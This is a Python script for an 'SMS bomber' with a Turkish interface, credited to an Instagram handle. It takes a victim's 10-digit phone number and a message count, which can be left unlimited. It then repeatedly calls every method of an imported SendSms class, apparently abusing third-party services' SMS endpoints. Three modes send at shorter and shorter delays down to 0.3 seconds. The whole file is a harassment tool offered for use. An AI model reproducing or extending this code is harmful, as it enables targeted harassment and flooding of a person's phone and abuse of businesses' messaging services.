from colorama import init, Fore, Style
from time import sleep
import os
from os import system
from sms import SendSms
from tqdm import tqdm

init(autoreset=True)

def clear():
    system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(f"""{Fore.CYAN}
╔════════════════════════════════════════════════════════════╗
║                  SMS BOMBER - 3 MOD                        ║
║                 Sadece Basarili Gonderimler                ║
╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    Instagram : omer17ll
""")

def get_phone():
    banner()
    print(f"{Fore.WHITE}Telefon Numarasi (10 haneli, +90 olmadan):{Style.RESET_ALL}")
    while True:
        num = input(f"{Fore.GREEN}> {Style.RESET_ALL}").strip()
        if len(num) == 10 and num.isdigit():
            return num
        print(f"{Fore.RED}Hata! 10 haneli rakam girin.{Style.RESET_ALL}")

def get_count():
    print(f"{Fore.WHITE}Kac SMS? (Bos = Sonsuz):{Style.RESET_ALL}")
    val = input(f"{Fore.GREEN}> {Style.RESET_ALL}").strip()
    return None if val == "" else int(val)

def send_log(phone):
    print(f"{Fore.MAGENTA}Tool basladi → Instagram: omer17ll{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}Hedef: {phone}{Style.RESET_ALL}\n")

def normal_mode(phone, count):
    print(f"{Fore.BLUE}NORMAL MOD BASLADI{Style.RESET_ALL}")
    sms = SendSms(phone, "")
    sent = 0
    target = count if count else float('inf')
    with tqdm(desc="Normal", unit="sms") as pbar:
        while sent < target:
            for m in [x for x in dir(SendSms) if callable(getattr(SendSms, x)) and not x.startswith("__")]:
                if sent >= target: break
                try:
                    if getattr(sms, m)():
                        sent += 1
                        pbar.update(1)
                        print(f"{Fore.LIGHTGREEN_EX}GONDERILDI → {m}{Style.RESET_ALL}")
                except:
                    pass
                sleep(1.2)

def ultra_mode(phone, count):
    print(f"{Fore.BLUE}ULTRA MOD BASLADI{Style.RESET_ALL}")
    sms = SendSms(phone, "")
    sent = 0
    target = count if count else float('inf')
    with tqdm(desc="Ultra", unit="sms") as pbar:
        while sent < target:
            for m in [x for x in dir(SendSms) if callable(getattr(SendSms, x)) and not x.startswith("__")]:
                if sent >= target: break
                try:
                    if getattr(sms, m)():
                        sent += 1
                        pbar.update(1)
                        print(f"{Fore.LIGHTGREEN_EX}GONDERILDI → {m}{Style.RESET_ALL}")
                except:
                    pass
                sleep(0.7)

def hypersonic_mode(phone, count):
    print(f"{Fore.RED}HYPERSONIC MOD BASLADI (Cok Hizli){Style.RESET_ALL}")
    sms = SendSms(phone, "")
    sent = 0
    target = count if count else float('inf')
    with tqdm(desc="HyperSonic", unit="sms") as pbar:
        while sent < target:
            for m in [x for x in dir(SendSms) if callable(getattr(SendSms, x)) and not x.startswith("__")]:
                if sent >= target: break
                try:
                    if getattr(sms, m)():
                        sent += 1
                        pbar.update(1)
                        print(f"{Fore.LIGHTGREEN_EX}GONDERILDI → {m}{Style.RESET_ALL}")
                except:
                    pass
                sleep(0.3)   # Cok hizli

def main():
    while True:
        banner()
        print(f"{Fore.YELLOW}1. Normal Mod")
        print(f"2. Ultra Mod")
        print(f"3. HyperSonic Mod (Fena)")
        print(f"4. Cikis{Style.RESET_ALL}\n")
        sec = input(f"{Fore.CYAN}Secim > {Style.RESET_ALL}")

        if sec == "4":
            banner()
            print(f"{Fore.RED}Program kapatiliyor...{Style.RESET_ALL}")
            sleep(1)
            break

        phone = get_phone()
        count = get_count()
        send_log(phone)

        if sec == "1":
            normal_mode(phone, count)
        elif sec == "2":
            ultra_mode(phone, count)
        elif sec == "3":
            hypersonic_mode(phone, count)
        else:
            continue

        input(f"\n{Fore.YELLOW}Menuye donmek icin Enter...{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
